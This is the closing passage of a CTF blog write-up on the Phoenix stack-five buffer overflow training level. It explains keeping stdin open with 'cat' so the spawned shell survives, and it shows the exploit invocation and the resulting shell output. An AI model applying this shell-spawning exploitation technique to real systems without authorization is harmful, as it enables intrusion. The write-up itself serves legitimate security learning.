</pre></table></code></div></div><h5 id="a-shell-needs-input">A shell needs input</h5><p>When we execute the shell with our exploit it expects input, from stdin. But we used a program and redirected it’s stdout into the input of the shell and once our program was done executing /bin/dash it closed the pipe, hence the shell had no way to get any input and just exits.<br /> There is a trick to get around that tho, when we use “cat” without any input it simply redirects its stdin to its stdout. We can chain our input and cat together and redirect their combined output into ./stack-five. As far as I know that is not possible from within gdb tho, good thing that we added some NOPs so we can execute it from anywhere.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>user@phoenix-amd64:/tmp$ (python exploit.py ; cat) | /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
whoami
phoenix-amd64-stack-five
</pre></table></code></div></div><p>Done. Now isn’t that beautiful? We got a Program with basically no intended functionality to execute a shell for us. Sadly it is not a root shell since the program does not have root privileges but at least to me it’s quite pleasant anyway :)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/binary-exploitation/'>Binary Exploitation</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >Buffer Overflow</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Phoenix Stack-Five - Marius Kimmina&url=https://mindslave.github.io/posts/PhoenixStackFive/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Phoenix Stack-Five - Marius Kimmina&u=https://mindslave.github.io/posts/PhoenixStackFive/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Phoenix Stack-Five - Marius Kimmina&url=https://mindslave.github.io/posts/PhoenixStackFive/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HackTheBox_Feline/">HackTheBox Feline</a><li><a href="/posts/HackTheBox_Resolute/">HackTheBox Resolute</a><li><a href="/posts/HackTheBox_ServMon/">HackTheBox ServMon</a><li><a href="/posts/mwa_packing/">Malware Analysis - Packing</a><li><a href="/posts/mwa_globeImposter/">Malware Analysis - unpacking GlobeImposter Ransomware</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/36c3/">36C3</a> <a class="post-tag" href="/tags/malware/">Malware</a> <a class="post-tag" href="/tags/packing/">Packing</a> <a class="post-tag" href="/tags/bsd/">BSD</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/dll-injection/">dll injection</a> <a class="post-tag" href="/tags/docker/">docker</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/PhoenixStack0/"><div class="card-body"> <span class="timeago small" > Oct 12, 2019 <i class="unloaded">2019-10-12T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Phoenix Stack-Zero and One</h3><div class="text-muted small"><p> 0x0. Introduction Phoenix is an entry level IT-Security challenge hosted at https://exploit.education/. It consists of multiple levels introducing participants to the concepts of binary exploitatio...</p></div></div></a></div><div class="card"> <a href="/posts/PhoenixStack2/"><div class="card-body"> <span class="timeago small" > Oct 20, 2019 <i class="unloaded">2019-10-20T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Phoenix Stack-Two</h3><div class="text-muted small"><p> 0x0. Introduction For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One). In this level we have to mess with environment variables a...</p></div></div></a></div><div class="card"> <a href="/posts/PhoenixStackThree/"><div class="card-body"> <span class="timeago small" > Oct 27, 2019 <i class="unloaded">2019-10-27T07:10:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Phoenix Stack-Three</h3><div class="text-muted small"><p> 0x0. Introduction For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One). In this level we have to use yet another buffer-overflow c...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/PhoenixStackFour/" class="btn btn-outline-primary" prompt="Older"><p>Phoenix Stack-Four</p></a> <a href="/posts/Pwnablekr_fd/" class="btn btn-outline-primary" prompt="Newer"><p>Pwnable.kr fd</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/Mindslave">Marius Kimmina</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/36c3/">36C3</a> <a class="post-tag" href="/tags/malware/">Malware</a> <a class="post-tag" href="/tags/packing/">Packing</a> <a class="post-tag" href="/tags/bsd/">BSD</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/dll-injection/">dll injection</a> <a class="post-tag" href="/tags/docker/">docker</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://mindslave.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
